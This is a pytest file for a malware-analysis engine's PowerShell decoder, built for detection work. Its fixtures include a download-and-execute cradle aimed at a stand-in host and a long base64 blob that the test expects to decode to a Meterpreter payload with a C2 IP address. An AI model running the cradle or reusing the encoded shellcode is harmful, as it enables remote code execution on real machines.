"""Phase-B tests · Batch 4 — PowerShell wrapper extractor."""
from __future__ import annotations

from engine import AnalysisContext, Budget, DecoderRegistry, Orchestrator
from engine.fingerprint_util import compute as fp


class TestWrapperExtractor:
    def test_registered(self):
        assert DecoderRegistry.get("extract-wrapper") is not None

    def test_frombase64string_variant(self):
        p = "[Byte[]]$x = [System.Convert]::FromBase64String('SGVsbG8gV29ybGQgQmFzZTY0IHdyYXBwZXI=')"
        dec = DecoderRegistry.get("extract-wrapper")
        det = dec.detect(p, fp(p), AnalysisContext())
        assert det.confidence >= 0.9
        res = dec.decode(p, det.args, AnalysisContext())
        assert res.output == "SGVsbG8gV29ybGQgQmFzZTY0IHdyYXBwZXI="
        # MCIP surface: MITRE + LOLBAS emitted
        assert any(h.id == "T1059.001" for h in res.mitre_hints)
        assert any(h.binary == "powershell.exe" for h in res.lolbas_hits)

    def test_encoded_command(self):
        p = 'powershell.exe -enc SGVsbG8gV29ybGQgQmFzZTY0IHdyYXBwZXI='
        dec = DecoderRegistry.get("extract-wrapper")
        det = dec.detect(p, fp(p), AnalysisContext())
        assert det.confidence > 0.5
        res = dec.decode(p, det.args, AnalysisContext())
        assert "SGVsbG8" in res.output
        assert any(h.id == "T1027" for h in res.mitre_hints)

    def test_downloadstring_url(self):
        p = "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/stage2.ps1')"
        dec = DecoderRegistry.get("extract-wrapper")
        det = dec.detect(p, fp(p), AnalysisContext())
        assert det.confidence > 0.5
        res = dec.decode(p, det.args, AnalysisContext())
        assert "malicious.example.com" in res.output
        assert any(h.id == "T1105" for h in res.mitre_hints)

    def test_no_wrapper_no_fire(self):
        p = "just plain text no wrappers here at all"
        dec = DecoderRegistry.get("extract-wrapper")
        det = dec.detect(p, fp(p), AnalysisContext())
        assert det.confidence == 0.0

    def test_full_meterpreter_chain(self):
        """Raw PowerShell one-liner → full MCIP report in one call."""
        FULL = (
            "[Byte[]]$var_code = [System.Convert]::FromBase64String("
            "'38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfI"
            "vOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIv"
            "BFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMj"
            "IyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyM"
            "R46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3"
            "Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyM"
            "a5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+"
            "VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZ"
            "RDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDF"
            "Q0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9"
            "l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwN"
            "NWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxg"
            "W2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS"
            "6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyM"
            "jIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjI"
            "yMg')"
        )
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=5000))).run(FULL)
        assert r.terminal == "family-identified"
        ids = [s.decoder for s in r.trace]
        assert ids == ["extract-wrapper", "base64-decode", "xor-brute"]
        assert r.findings.family.family
        assert "Meterpreter" in r.findings.family.family or "MSFvenom" in r.findings.family.family
        assert "149.28.81.19" in r.findings.iocs.ips
        assert "T1059.001" in {h.id for h in r.findings.mitre_techniques}
        assert "T1027" in {h.id for h in r.findings.mitre_techniques}
        assert "powershell.exe" in {h.binary for h in r.findings.lolbas}
        assert r.findings.verdict == "malicious"
        assert r.findings.risk_score >= 80
